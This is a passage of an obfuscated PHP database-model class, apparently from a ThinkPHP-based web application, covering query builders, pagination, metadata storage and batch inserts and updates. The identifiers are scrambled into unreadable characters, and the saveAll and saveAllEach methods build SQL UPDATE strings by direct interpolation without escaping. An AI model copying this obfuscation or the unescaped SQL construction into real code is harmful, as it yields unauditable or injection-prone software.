$ÅƒÔÇ“ = $this->db->getFields($this->options[$‘Èáö’[340]]); return $ÅƒÔÇ“ ? array_keys($ÅƒÔÇ“) : !1; } if ($this->fields) { $ÅƒÔÇ“ = $this->fields; unset($ÅƒÔÇ“[$‘Èáö’[311]], $ÅƒÔÇ“[$‘Èáö’[312]], $ÅƒÔÇ“[$‘Èáö’[313]], $ÅƒÔÇ“[$‘Èáö’[310]]); return $ÅƒÔÇ“; } return !1; } public function data($ÒäÆ¯”² = '') { $¨Öıï‡ =& $_SERVER[÷åé¼î]; if ($¨Öıï‡[12] === $ÒäÆ¯”² && !empty($this->data)) { return $this->data; } if (is_object($ÒäÆ¯”²)) { $ÒäÆ¯”² = get_object_vars($ÒäÆ¯”²); } elseif (is_string($ÒäÆ¯”²)) { parse_str($ÒäÆ¯”², $ÒäÆ¯”²); } elseif (!is_array($ÒäÆ¯”²)) { think_exception(think_lang($¨Öıï‡[332])); } $this->data = $ÒäÆ¯”²; return $this; } public function join($úÆëßÈç) { $¤›£Ğï =& $_SERVER[÷åé¼î]; if (is_array($úÆëßÈç)) { $this->options[$¤›£Ğï[343]] = $úÆëßÈç; } elseif (!empty($úÆëßÈç)) { $this->options[$¤›£Ğï[343]][] = $úÆëßÈç; } return $this; } public function union($‹ı¤ó‡, $ÄÉ¥³ÊŠ = false) { $öÍİé =& $_SERVER[÷åé¼î]; if (empty($‹ı¤ó‡)) { return $this; } if ($ÄÉ¥³ÊŠ) { $this->options[$öÍİé[407]][$öÍİé[408]] = !0; } if (is_object($‹ı¤ó‡)) { $‹ı¤ó‡ = get_object_vars($‹ı¤ó‡); } if (is_string($‹ı¤ó‡)) { $Ô¹ÖĞ½ı = $‹ı¤ó‡; } elseif (is_array($‹ı¤ó‡)) { if (isset($‹ı¤ó‡[0])) { $this->options[$öÍİé[407]] = array_merge($this->options[$öÍİé[407]], $‹ı¤ó‡); return $this; } else { $Ô¹ÖĞ½ı = $‹ı¤ó‡; } } else { think_exception(think_lang($öÍİé[332])); } $this->options[$öÍİé[407]][] = $Ô¹ÖĞ½ı; return $this; } public function cache($Ã®Ú˜™ = true, $Ùëõ›ƒé = null, $—ĞÁ˜Ï© = '') { $…Æ•Ï â =& $_SERVER[÷åé¼î]; if (!1 !== $Ã®Ú˜™) { $this->options[$…Æ•Ï â[409]] = array($…Æ•Ï â[97] => $Ã®Ú˜™, $…Æ•Ï â[399] => $Ùëõ›ƒé, $…Æ•Ï â[33] => $—ĞÁ˜Ï©); } return $this; } public function field($Ñ‹°µ‚å, $õ¨ÓÀùí = false) { $öˆ­­õ‚ =& $_SERVER[÷åé¼î]; if (!0 === $Ñ‹°µ‚å) { $Ÿó¯Ù“É = $this->getDbFields(); $Ñ‹°µ‚å = $Ÿó¯Ù“É ? $Ÿó¯Ù“É : $öˆ­­õ‚[220]; } elseif ($õ¨ÓÀùí) { if (is_string($Ñ‹°µ‚å)) { $Ñ‹°µ‚å = explode($öˆ­­õ‚[50], $Ñ‹°µ‚å); } $Ÿó¯Ù“É = $this->getDbFields(); $Ñ‹°µ‚å = $Ÿó¯Ù“É ? array_diff($Ÿó¯Ù“É, $Ñ‹°µ‚å) : $Ñ‹°µ‚å; } $this->options[$öˆ­­õ‚[334]] = $Ñ‹°µ‚å; return $this; } public function scope($Û°¢ö³§ = '', $´Í°öáÓ = NULL) { $¿ñÑÔ‹õ =& $_SERVER[÷åé¼î]; if ($¿ñÑÔ‹õ[12] === $Û°¢ö³§) { if (isset($this->_scope[$¿ñÑÔ‹õ[37]])) { $¡ú¦ƒ‡— = $this->_scope[$¿ñÑÔ‹õ[37]]; } else { return $this; } } elseif (is_string($Û°¢ö³§)) { $à˜ÒŒ‚  = explode($¿ñÑÔ‹õ[50], $Û°¢ö³§); $¡ú¦ƒ‡— = array(); foreach ($à˜ÒŒ‚  as $—ïêËŠ) { if (!isset($this->_scope[$—ïêËŠ])) { continue; } $¡ú¦ƒ‡— = array_merge($¡ú¦ƒ‡—, $this->_scope[$—ïêËŠ]); } if (!empty($´Í°öáÓ) && is_array($´Í°öáÓ)) { $¡ú¦ƒ‡— = array_merge($¡ú¦ƒ‡—, $´Í°öáÓ); } } elseif (is_array($Û°¢ö³§)) { $¡ú¦ƒ‡— = $Û°¢ö³§; } if (is_array($¡ú¦ƒ‡—) && !empty($¡ú¦ƒ‡—)) { $this->options = array_merge($this->options, array_change_key_case($¡ú¦ƒ‡—)); } return $this; } public function where($—ïÜ«è, $­‚»äöñ = null) { $ßûàö÷ó =& $_SERVER[÷åé¼î]; if (!is_null($­‚»äöñ) && is_string($—ïÜ«è)) { if (!is_array($­‚»äöñ)) { $­‚»äöñ = func_get_args(); array_shift($­‚»äöñ); } $­‚»äöñ = array_map(array($this->db, $ßûàö÷ó[403]), $­‚»äöñ); $—ïÜ«è = vsprintf($—ïÜ«è, $­‚»äöñ); } elseif (is_object($—ïÜ«è)) { $—ïÜ«è = get_object_vars($—ïÜ«è); } elseif (is_array($—ïÜ«è)) { foreach ($—ïÜ«è as $å¨å…œ´ => $•ß³§¥Ş) { if ((is_numeric($å¨å…œ´) || !$å¨å…œ´) && is_string($•ß³§¥Ş)) { if (strpos($•ß³§¥Ş, $ßûàö÷ó[410]) === 0) { continue; } think_trace($ßûàö÷ó[411], $ßûàö÷ó[12], $ßûàö÷ó[49]); die; } } } if (is_string($—ïÜ«è) && $ßûàö÷ó[12] != $—ïÜ«è) { $Ëı„´¯ù = array(); $Ëı„´¯ù[$ßûàö÷ó[412]] = $—ïÜ«è; $—ïÜ«è = $Ëı„´¯ù; } if (isset($this->options[$ßûàö÷ó[336]])) { $this->options[$ßûàö÷ó[336]] = array_merge($this->options[$ßûàö÷ó[336]], $—ïÜ«è); } else { $this->options[$ßûàö÷ó[336]] = $—ïÜ«è; } return $this; } public function limit($­ãÍ•Ù, $â­á¬‘µ = null) { $º“Šà´¿ =& $_SERVER[÷åé¼î]; $this->options[$º“Šà´¿[352]] = is_null($â­á¬‘µ) ? $­ãÍ•Ù : $­ãÍ•Ù . $º“Šà´¿[50] . $â­á¬‘µ; return $this; } public function page($İ°ŞşÅ•, $¢ÃÉÖææ = null) { $¢öÎ½£€ =& $_SERVER[÷åé¼î]; $this->options[$¢öÎ½£€[413]] = is_null($¢ÃÉÖææ) ? $İ°ŞşÅ• : $İ°ŞşÅ• . $¢öÎ½£€[50] . $¢ÃÉÖææ; return $this; } public function comment($³¤Òâò´) { $this->options[$_SERVER[÷åé¼î][414]] = $³¤Òâò´; return $this; } public function setProperty($ôáå†×, $”Â•ƒÅ¨) { if (property_exists($this, $ôáå†×)) { $this->{$ôáå†×} = $”Â•ƒÅ¨; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\146\171\124\151\x6d\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\164\54\x75\160\144\141\164\x65", "\x66\165\x6e\143\x74\151\x6f\x6e"), array("\143\162\145\141\x74\145\124\151\x6d\145", "\164\151\155\145", "\151\156\x73\x65\162\164", "\146\x75\x6e\x63\164\x69\157\x6e")); public function setDataAuto($©‡è¸Šá) { $this->dataAuto = $©‡è¸Šá; } public function __construct($şëû…‘ = '', $ƒü­Ó›µ = '', $óãá¶† = '') { parent::__construct($şëû…‘, $ƒü­Ó›µ, $óãá¶†); } protected $tableMeta = array(); protected function _beforeInsert(&$…§ÎúÍÚ, $¢Á¬Ü‰) { $ŞÌçğµ =& $_SERVER[÷åé¼î]; if (!$this->checkDataAutoHas($ŞÌçğµ[415])) { return; } $this->dataBeforeFilter($…§ÎúÍÚ, $ŞÌçğµ[415]); } protected function _beforeUpdate(&$á÷ĞàµÀ, $üæÇóÛÛ) { $ıãÌƒ•© =& $_SERVER[÷åé¼î]; if (!$this->checkDataAutoHas($ıãÌƒ•©[416])) { return; } $this->dataBeforeFilter($á÷ĞàµÀ, $ıãÌƒ•©[416]); } protected function _afterSelect(&$‡ÜŸ¸œü, $óæ“å²İ) { if (!is_array($‡ÜŸ¸œü)) { return; } if (!$this->checkDataAutoHas($_SERVER[÷åé¼î][417])) { return; } foreach ($‡ÜŸ¸œü as &$ûÛÛ†Å¾) { $this->dataAfterFilter($ûÛÛ†Å¾); } unset($ûÛÛ†Å¾); } protected function _afterFind(&$Ç“ÔÈ˜·, $Û²ûµ ©) { if (!is_array($Ç“ÔÈ˜·)) { return; } if (!$this->checkDataAutoHas($_SERVER[÷åé¼î][417])) { return; } $this->dataAfterFilter($Ç“ÔÈ˜·); } public static function textEncode($àíÚ¤şö) { if (!$àíÚ¤şö) { return $àíÚ¤şö; } $µ¥âÂ¯Ã = json_encode($àíÚ¤şö); $µ¥âÂ¯Ã = preg_replace_callback($_SERVER[÷åé¼î][418], function ($³Ûø†®Ï) { return addslashes($³Ûø†®Ï[0]); }, $µ¥âÂ¯Ã); return json_decode($µ¥âÂ¯Ã); } public static function textDecode($ÔÊ”×èî) { $ä ²¨Íš =& $_SERVER[÷åé¼î]; $õ¿œ±é† = json_encode($ÔÊ”×èî); $õ¿œ±é† = preg_replace_callback($ä ²¨Íš[419], function ($ÀøŠåø÷) { return $_SERVER[÷åé¼î][100]; }, $õ¿œ±é†); return json_decode($õ¿œ±é†); } public function setAutoIncrement($¢¿ÅÏìÙ) { $êÒŸ»ï = array($this->getPk() => $¢¿ÅÏìÙ); $ş”²Ô“À = $this->data($êÒŸ»ï)->add(); if ($ş”²Ô“À) { $this->delete($ş”²Ô“À); } } public function getAutoIncrement() { $Å‚ŞäÂ› = $this->getTableName(); $Ê£Ä°ì° = $this->max($this->getPk()); $«ÆøÜì§ = $this->query("\x73\150\157\x77\40\164\141\x62\x6c\145\40\x73\164\x61\164\x75\x73\40\167\150\x65\162\145\x20\x4e\x61\x6d\145\75\47{$Å‚ŞäÂ›}\47"); $ŠÁ¾»¾µ = $«ÆøÜì§[0][$_SERVER[÷åé¼î][420]]; $“ÍŒñ–š = max($Ê£Ä°ì°, $ŠÁ¾»¾µ); return $“ÍŒñ–š; } protected function _callBefore($±ñØÀ, $ôúÕıÅ¶) { return $this->cacheCallCheck($±ñØÀ, $ôúÕıÅ¶, !1); } protected function _callAfter($½¢Ï‡äç, $»Á¾¹”Å) { return $this->cacheCallCheck($½¢Ï‡äç, $»Á¾¹”Å, !0); } protected function cacheFunctionAlias($Ï©¯Œ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($µ¸ø­ğ÷, $ç¸ÂÅŞ, $í ØŞÎë = false) { $«°÷¦Ş = $this->cacheFunctionAlias($ç¸ÂÅŞ); if (!$«°÷¦Ş) { return; } foreach ($«°÷¦Ş as $ÛÛŠ†×ı => $©ÙÔÚÜ) { $¨ãàßè• = $©ÙÔÚÜ[0]; $ÛàÄúú‚ = explode($_SERVER[÷åé¼î][50], $©ÙÔÚÜ[1]); if ($µ¸ø­ğ÷ == $ÛÛŠ†×ı) { return $this->cacheFunctionGet($ÛÛŠ†×ı, $¨ãàßè•); } if ($í ØŞÎë && in_array($µ¸ø­ğ÷, $ÛàÄúú‚)) { $this->cacheFunctionClear($ÛÛŠ†×ı, $¨ãàßè•); } } } public function cacheFunctionGet($ßïÍıøİ, $Ÿ¢µÆ°³) { $ï€êÃİÛ = $this->cacheKeyMake($ßïÍıøİ, $Ÿ¢µÆ°³); $‘¨ı®œı = Cache::get($ï€êÃİÛ); if (!is_array($‘¨ı®œı)) { $‘¨ı®œı = call_user_func_array(array($this, $ßïÍıøİ), array($Ÿ¢µÆ°³, !0)); Cache::set($ï€êÃİÛ, $‘¨ı®œı); } return $‘¨ı®œı; } public function cacheFunctionClear($ÂãÂœËŠ, $ÙÛÇ³„) { $çÆ»•öÂ = $ÙÛÇ³„; if (!is_array($ÙÛÇ³„)) { $çÆ»•öÂ = array($ÙÛÇ³„); } foreach ($çÆ»•öÂ as $±µ¡âš±) { $ªÎ¢¼–¾ = $this->cacheKeyMake($ÂãÂœËŠ, $±µ¡âš±); Cache::remove($ªÎ¢¼–¾); } } private function cacheKeyMake($ˆ„İ³µ, $ÒÎÔó…‡) { $Š¼‹”ßê =& $_SERVER[÷åé¼î]; return get_class($this) . $Š¼‹”ßê[11] . $ˆ„İ³µ . $Š¼‹”ßê[421] . $ÒÎÔó…‡; } protected function selectPageReset() { $¤ó‡®€ª =& $_SERVER[÷åé¼î]; if (isset($GLOBALS[$¤ó‡®€ª[422]])) { return; } $GLOBALS[$¤ó‡®€ª[422]] = isset($GLOBALS[$¤ó‡®€ª[7]][$¤ó‡®€ª[423]]) ? $GLOBALS[$¤ó‡®€ª[7]][$¤ó‡®€ª[423]] : !1; $GLOBALS[$¤ó‡®€ª[424]] = isset($GLOBALS[$¤ó‡®€ª[7]][$¤ó‡®€ª[413]]) ? $GLOBALS[$¤ó‡®€ª[7]][$¤ó‡®€ª[413]] : !1; $GLOBALS[$¤ó‡®€ª[7]][$¤ó‡®€ª[423]] = !1; $GLOBALS[$¤ó‡®€ª[7]][$¤ó‡®€ª[413]] = !1; } protected function selectPageRestore() { $ìîÈµ„ =& $_SERVER[÷åé¼î]; if (!isset($GLOBALS[$ìîÈµ„[422]])) { return; } $GLOBALS[$ìîÈµ„[7]][$ìîÈµ„[423]] = $GLOBALS[$ìîÈµ„[422]]; $GLOBALS[$ìîÈµ„[7]][$ìîÈµ„[413]] = $GLOBALS[$ìîÈµ„[424]]; if ($GLOBALS[$ìîÈµ„[7]][$ìîÈµ„[423]] === !1) { unset($GLOBALS[$ìîÈµ„[7]][$ìîÈµ„[423]]); } if ($GLOBALS[$ìîÈµ„[7]][$ìîÈµ„[413]] === !1) { unset($GLOBALS[$ìîÈµ„[7]][$ìîÈµ„[413]]); } unset($GLOBALS[$ìîÈµ„[422]]); unset($GLOBALS[$ìîÈµ„[424]]); } protected function selectPage($ØâéÍ‡¦ = 200, $ïğãÅ„ã = 1) { $Å«î¨“° =& $_SERVER[÷åé¼î]; global $in; $¹¸»–î = $this->optionsValue(); $Õï—ëéÑ = 50000; $ØâéÍ‡¦ = isset($in[$Å«î¨“°[423]]) && $in[$Å«î¨“°[423]] ? $in[$Å«î¨“°[423]] : $ØâéÍ‡¦; if ($ØâéÍ‡¦ === -1) { $in[$Å«î¨“°[423]] = !1; $Õï—ëéÑ = 100000000; $ØâéÍ‡¦ = $Õï—ëéÑ; } $©Ùœ»öª = $¹¸»–î; $©Ùœ»öª[$Å«î¨“°[425]] = array(); $ØâéÍ‡¦ = intval($ØâéÍ‡¦); $ØâéÍ‡¦ = $ØâéÍ‡¦ <= 5 ? 5 : ($ØâéÍ‡¦ >= $Õï—ëéÑ ? $Õï—ëéÑ : $ØâéÍ‡¦); $ïğãÅ„ã = intval(isset($in[$Å«î¨“°[413]]) && $in[$Å«î¨“°[413]] ? $in[$Å«î¨“°[413]] : $ïğãÅ„ã); $ïğãÅ„ã = $ïğãÅ„ã <= 1 ? 1 : $ïğãÅ„ã; $ìùÁèöÚ = array(); $şó¸±´æ = 1; if ($ïğãÅ„ã == 1 && $şó¸±´æ) { $this->optionsValue($¹¸»–î); $ìùÁèöÚ = $this->page($ïğãÅ„ã, $ØâéÍ‡¦)->select(); $è§—„¦… = is_array($ìùÁèöÚ) ? count($ìùÁèöÚ) : 0; if ($è§—„¦… < $ØâéÍ‡¦) { $²õ¯…õä = 1; } else { $this->optionsValue($©Ùœ»öª); $è§—„¦… = intval($this->count()); $²õ¯…õä = ceil($è§—„¦… / $ØâéÍ‡¦); } } else { $this->optionsValue($©Ùœ»öª); $è§—„¦… = intval($this->count()); $²õ¯…õä = ceil($è§—„¦… / $ØâéÍ‡¦); $ïğãÅ„ã = $ïğãÅ„ã >= $²õ¯…õä ? $²õ¯…õä : $ïğãÅ„ã; $this->optionsValue($¹¸»–î); $ìùÁèöÚ = $this->page($ïğãÅ„ã, $ØâéÍ‡¦)->select(); } if (!is_array($ìùÁèöÚ)) { $ìùÁèöÚ = array(); } if ($²õ¯…õä == 1) { $è§—„¦… = count($ìùÁèöÚ); } $ÚÖø–î = array($Å«î¨“°[426] => array($Å«î¨“°[427] => $è§—„¦…, $Å«î¨“°[423] => $ØâéÍ‡¦, $Å«î¨“°[413] => $ïğãÅ„ã, $Å«î¨“°[428] => $²õ¯…õä), $Å«î¨“°[429] => $ìùÁèöÚ); return $ÚÖø–î; } protected function checkLength($’µ€Î¦, $óõÒ›Íª = 0, $“°ˆõƒ¾ = '') { $¥³–”²« =& $_SERVER[÷åé¼î]; $óõÒ›Íª = $óõÒ›Íª ? $óõÒ›Íª : 65536; if (!$’µ€Î¦ || strlen($’µ€Î¦) < $óõÒ›Íª) { return; } $“°ˆõƒ¾ = $“°ˆõƒ¾ ? $“°ˆõƒ¾ . $¥³–”²«[74] : $¥³–”²«[12]; show_json($“°ˆõƒ¾ . LNG($¥³–”²«[430]) . "\x28{$óõÒ›Íª}\x29", !1); } protected function metaSet($¨ÚŸàª½, $ñ±ì®ÕÜ = null, $±Î‚‰æ = null) { $µ•¯ûˆ =& $_SERVER[÷åé¼î]; if (!$this->tableMeta || !$¨ÚŸàª½) { return !1; } $­‹¿¬ = $this->tableMeta[$µ•¯ûˆ[431]]; $ÛË±ß = $this->tableMeta[$µ•¯ûˆ[432]]; $ƒ¡ªøÙÎ = Model($ÛË±ß); $š…ƒ«çÓ = array($­‹¿¬ => $¨ÚŸàª½, $µ•¯ûˆ[433] => $ñ±ì®ÕÜ); if (is_null($ñ±ì®ÕÜ)) { return $ƒ¡ªøÙÎ->where(array($­‹¿¬ => $¨ÚŸàª½))->delete(); } if (is_null($±Î‚‰æ) && is_string($ñ±ì®ÕÜ)) { return $ƒ¡ªøÙÎ->where($š…ƒ«çÓ)->delete(); } $±†İŸë¹ = is_array($ñ±ì®ÕÜ) ? $ñ±ì®ÕÜ : array(); if (is_string($ñ±ì®ÕÜ)) { $±†İŸë¹[$ñ±ì®ÕÜ] = $±Î‚‰æ; } $ÅğÆ¤³ = array(); foreach ($±†İŸë¹ as $…Ñ×©¼‹ => $³³îšéÒ) { if (is_null($³³îšéÒ) && is_string($…Ñ×©¼‹)) { $ƒ¡ªøÙÎ->where(array($­‹¿¬ => $¨ÚŸàª½, $µ•¯ûˆ[433] => $…Ñ×©¼‹))->delete(); continue; } $this->checkLength($³³îšéÒ, !1, $ÛË±ß . $µ•¯ûˆ[4] . $…Ñ×©¼‹); $ÅğÆ¤³[] = array($­‹¿¬ => $¨ÚŸàª½, $µ•¯ûˆ[97] => $…Ñ×©¼‹, $µ•¯ûˆ[434] => $³³îšéÒ); } $Ğûğñ˜é = $µ•¯ûˆ[435] . $ÛË±ß; CacheLock::lock($Ğûğñ˜é); $ƒ¡ªøÙÎ->where(array($­‹¿¬ => $¨ÚŸàª½))->addAll($ÅğÆ¤³, array(), !0); CacheLock::unlock($Ğûğñ˜é); return !0; } public function metaGet($”ı‡˜«€, $ÓÂœÄ¡Ç = false) { $“—Ô·„‘ =& $_SERVER[÷åé¼î]; if (!$this->tableMeta) { return array(); } $ø„ŞÑŸ× = $this->tableMeta[$“—Ô·„‘[431]]; $÷“»¦Ã¸ = Model($this->tableMeta[$“—Ô·„‘[432]]); if ($ÓÂœÄ¡Ç) { $—ƒüµ = array($ø„ŞÑŸ× => $”ı‡˜«€, $“—Ô·„‘[97] => $ÓÂœÄ¡Ç); return $÷“»¦Ã¸->where($—ƒüµ)->getField($“—Ô·„‘[434]); } $—ƒüµ = array($ø„ŞÑŸ× => $”ı‡˜«€); $¥“ÃÙï = $÷“»¦Ã¸->field($“—Ô·„‘[436])->where($—ƒüµ)->select(); $¥“ÃÙï = array_to_keyvalue($¥“ÃÙï, $“—Ô·„‘[97], $“—Ô·„‘[434]); return $¥“ÃÙï; } private function checkDataAutoHas($Á¼÷Í¡¿) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $«¹ÊÆ×¨) { if (in_array($Á¼÷Í¡¿, explode($_SERVER[÷åé¼î][50], $«¹ÊÆ×¨[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Û–ú£‹ù, $Ôƒ»Å¬–) { $ä¶ˆ§ËŸ =& $_SERVER[÷åé¼î]; if (!is_array($Û–ú£‹ù)) { return; } foreach ($this->dataAuto as $ŞÆ¨ƒ“ù) { $•ú’•·› = $ŞÆ¨ƒ“ù[0]; if (!in_array($Ôƒ»Å¬–, explode($ä¶ˆ§ËŸ[50], $ŞÆ¨ƒ“ù[2]))) { continue; } switch (trim($ŞÆ¨ƒ“ù[3])) { case $ä¶ˆ§ËŸ[381]: case $ä¶ˆ§ËŸ[382]: $ÁàØ»É€ = $ŞÆ¨ƒ“ù[1]; $ûÎœ¾›¹ = isset($ŞÆ¨ƒ“ù[4]) ? (array) $ŞÆ¨ƒ“ù[4] : array(); if ($ÁàØ»É€ == $ä¶ˆ§ËŸ[206] && array_key_exists($•ú’•·›, $Û–ú£‹ù)) { if (!$Û–ú£‹ù[$•ú’•·›]) { unset($Û–ú£‹ù[$•ú’•·›]); } break; } if (isset($Û–ú£‹ù[$•ú’•·›])) { array_unshift($ûÎœ¾›¹, $Û–ú£‹ù[$•ú’•·›]); } if ($ä¶ˆ§ËŸ[381] == $ŞÆ¨ƒ“ù[3]) { $Û–ú£‹ù[$•ú’•·›] = call_user_func_array($ÁàØ»É€, $ûÎœ¾›¹); } else { $Û–ú£‹ù[$•ú’•·›] = call_user_func_array(array(&$this, $ÁàØ»É€), $ûÎœ¾›¹); } break; case $ä¶ˆ§ËŸ[331]: if (isset($Û–ú£‹ù[$•ú’•·›]) && $Û–ú£‹ù[$•ú’•·›]) { $Û–ú£‹ù[$•ú’•·›] = call_user_func_array(array(&$this, $ŞÆ¨ƒ“ù[1]), array($Û–ú£‹ù[$•ú’•·›])); } break; case $ä¶ˆ§ËŸ[334]: $Û–ú£‹ù[$•ú’•·›] = $Û–ú£‹ù[$ŞÆ¨ƒ“ù[1]]; break; case $ä¶ˆ§ËŸ[354]: if (isset($Û–ú£‹ù[$•ú’•·›]) && !is_string($Û–ú£‹ù[$•ú’•·›])) { $Û–ú£‹ù[$•ú’•·›] = json_encode_force($Û–ú£‹ù[$•ú’•·›]); } break; case $ä¶ˆ§ËŸ[383]: if ($Û–ú£‹ù[$•ú’•·›] === $ä¶ˆ§ËŸ[12]) { unset($Û–ú£‹ù[$•ú’•·›]); } break; case $ä¶ˆ§ËŸ[384]: $Û–ú£‹ù[$•ú’•·›] = $ŞÆ¨ƒ“ù[1]; default: break; } } if ($Ôƒ»Å¬– == $ä¶ˆ§ËŸ[415]) { $óñÂ†Öñ = strtolower($this->db->getDbType()); if (strpos($óñÂ†Öñ, $ä¶ˆ§ËŸ[13]) !== 0) { return; } $ÎëÍâŠˆ = $this->field(!0)->fields; $òÓşÁ· = $ÎëÍâŠˆ[$ä¶ˆ§ËŸ[313]]; if (isset($ÎëÍâŠˆ[$ä¶ˆ§ËŸ[312]])) { unset($òÓşÁ·[$ÎëÍâŠˆ[$ä¶ˆ§ËŸ[312]]]); } foreach ($òÓşÁ· as $ıœñô => $Ôƒ»Å¬–) { if (!isset($Û–ú£‹ù[$ıœñô])) { $Û–ú£‹ù[$ıœñô] = $ä¶ˆ§ËŸ[12]; } } } } private function dataAfterFilter(&$Óµ°ÎËú) { $”Äé²Ö© =& $_SERVER[÷åé¼î]; foreach ($this->dataAuto as $¦©Âò’Î) { $Õ£ÕÅú = $¦©Âò’Î[0]; if (!isset($Óµ°ÎËú[$Õ£ÕÅú])) { continue; } if (!in_array($”Äé²Ö©[417], explode($”Äé²Ö©[50], $¦©Âò’Î[2]))) { continue; } switch (trim($¦©Âò’Î[3])) { case $”Äé²Ö©[381]: case $”Äé²Ö©[382]: $÷Úô¥Óç = isset($¦©Âò’Î[4]) ? (array) $¦©Âò’Î[4] : array(); array_unshift($÷Úô¥Óç, $Óµ°ÎËú[$Õ£ÕÅú]); if (isset($¦©Âò’Î[4]) && $¦©Âò’Î[4] == $”Äé²Ö©[437]) { $÷Úô¥Óç = array($Óµ°ÎËú[$Õ£ÕÅú]); } if ($”Äé²Ö©[381] == $¦©Âò’Î[3]) { $Óµ°ÎËú[$Õ£ÕÅú] = call_user_func_array($¦©Âò’Î[1], $÷Úô¥Óç); } else { $Óµ°ÎËú[$Õ£ÕÅú] = call_user_func_array(array(&$this, $¦©Âò’Î[1]), $÷Úô¥Óç); } break; case $”Äé²Ö©[331]: if (isset($Óµ°ÎËú[$Õ£ÕÅú]) && $Óµ°ÎËú[$Õ£ÕÅú]) { $Óµ°ÎËú[$Õ£ÕÅú] = call_user_func_array(array(&$this, $¦©Âò’Î[1]), array($Óµ°ÎËú[$Õ£ÕÅú])); } break; case $”Äé²Ö©[334]: $Óµ°ÎËú[$Õ£ÕÅú] = $Óµ°ÎËú[$¦©Âò’Î[1]]; break; case $”Äé²Ö©[354]: $çÅÚİàÌ = $Óµ°ÎËú[$Õ£ÕÅú]; $Óµ°ÎËú[$Õ£ÕÅú] = json_decode($çÅÚİàÌ, !0); if (is_null($Óµ°ÎËú[$Õ£ÕÅú])) { $Óµ°ÎËú[$Õ£ÕÅú] = $çÅÚİàÌ; } break; case $”Äé²Ö©[383]: if ($Óµ°ÎËú[$Õ£ÕÅú] === $”Äé²Ö©[12]) { unset($Óµ°ÎËú[$Õ£ÕÅú]); } break; case $”Äé²Ö©[384]: $Óµ°ÎËú[$Õ£ÕÅú] = $¦©Âò’Î[1]; break; default: break; } } } public function saveAll($ÌıñµŠÈ) { $³ó¦µç =& $_SERVER[÷åé¼î]; $àÌ†æìŸ = $this->tablePrefix . $this->tableName; $á¼ı‘Şä = self::SQL_WHERE_IN_CHUNK; $ÌıñµŠÈ = is_array($ÌıñµŠÈ) ? $ÌıñµŠÈ : array(); $©È¾Ş¾¶ = $³ó¦µç[438]; $æå¡ûœ° = 0; $ü¢³´¸ï = array(); $©˜š—ã = count($ÌıñµŠÈ); for ($¥µ†éúÁ = 0; $¥µ†éúÁ < $©˜š—ã; $¥µ†éúÁ++) { $è²Ğ•çï = $ÌıñµŠÈ[$¥µ†éúÁ]; if (!is_array($è²Ğ•çï) || count($è²Ğ•çï) != 4) { continue; } $­œÙ§Ïè = "\125\120\104\x41\124\105\x20\x60{$àÌ†æìŸ}\x60\40\x53\105\x54\x20{$è²Ğ•çï[2]}\40\x3d\x20\x43\x41\x53\105\x20{$è²Ğ•çï[0]}\x20\12"; if ($æå¡ûœ° == 0) { $©È¾Ş¾¶ = $­œÙ§Ïè; } $ü¢³´¸ï[] = $³ó¦µç[121] . $è²Ğ•çï[1] . $³ó¦µç[121]; $æå¡ûœ°++; $©È¾Ş¾¶ .= "\x20\127\x48\105\116\x20\47{$è²Ğ•çï[1]}\x27\x20\124\110\x45\x4e\40\x27{$è²Ğ•çï[3]}\x27\40\xa"; if ($æå¡ûœ° == $á¼ı‘Şä || $¥µ†éúÁ == $©˜š—ã - 1) { $½“œÚ = implode($³ó¦µç[50], $ü¢³´¸ï); $©È¾Ş¾¶ .= "\x20\x45\x4e\x44\40\40\x57\x48\105\x52\x45\40{$è²Ğ•çï[0]}\x20\x49\x4e\40\50{$½“œÚ}\x29\40"; $this->execute($©È¾Ş¾¶); $æå¡ûœ° = 0; $©È¾Ş¾¶ = $­œÙ§Ïè; $this->chunkEventCheck(count($ü¢³´¸ï)); $ü¢³´¸ï = array(); } } $this->chunkEventSet(); } public function saveAllEach($ì¸ÌÛ») { $ç—Ü›Ô =& $_SERVER[÷åé¼î]; $®éœ°â• = $this->tablePrefix . $this->tableName; foreach ($ì¸ÌÛ» as $Éíª¶ı) { if (!is_array($Éíª¶ı) || count($Éíª¶ı) != 4) { continue; } $€ƒ±„ä¨ = $Éíª¶ı[0] . $ç—Ü›Ô[439] . $Éíª¶ı[1] . $ç—Ü›Ô[121]; $ÓÛÁã½ = $Éíª¶ı[2] . $ç—Ü›Ô[439] . $Éíª¶ı[3] . $ç—Ü›Ô[121]; $ìñŒºÄÓ = "\165\160\x64\x61\x74\145\x20{$®éœ°â•}\x20\163\x65\x74\x20{$ÓÛÁã½}\x20\167\x68\145\x72\145\x20{$€ƒ±„ä¨}\73"; $this->execute($ìñŒºÄÓ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($†Ó·ßâ¦ = false, $Œ’½°† = false) { $this->_chunkEvent = $†Ó·ßâ¦; $this->_chunkEventParam = $Œ’½°†; } private function chunkEventCheck($åôàí¬) { if (!$this->_chunkEvent) { return; } $½€­µú = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $½€­µú[$_SERVER[÷åé¼î][440]] = $åôàí¬; Hook::trigger($this->_chunkEvent, $½€­µú); } public function addAll($äŠ„ØŞ˜, $Ãš×¬şë = array(), $‘ªÎüÊÜ = false) { $Æï£Øøú =& $_SERVER[÷åé¼î]; ignore_timeout(); $âà¹®Æ¡ = self::SQL_WHERE_IN_CHUNK; if (empty($äŠ„ØŞ˜)) { $this->error = think_lang($Æï£Øøú[332]); return !1; } $Ãš×¬şë = $this->_parseOptions($Ãš×¬şë); foreach ($äŠ„ØŞ˜ as $ı–öı  => $ÓÚı½€) { $äŠ„ØŞ˜[$ı–öı ] = $this->_facade($ÓÚı½€); $this->_beforeInsert($äŠ„ØŞ˜[$ı–öı ], $Ãš×¬şë); } if (method_exists($this->db, $Æï£Øøú[333])) { for ($’ï·Å³Õ = 0; $’ï·Å³Õ < count($äŠ„ØŞ˜); $’ï·Å³Õ += $âà¹®Æ¡) { $¹—ë”ÌÌ = array_slice($äŠ„ØŞ˜, $’ï·Å³Õ, $âà¹®Æ¡); if (!is_array($¹—ë”ÌÌ) || count($¹—ë”ÌÌ) == 0) { break; } $Ü¯Ëµ¦Ä = 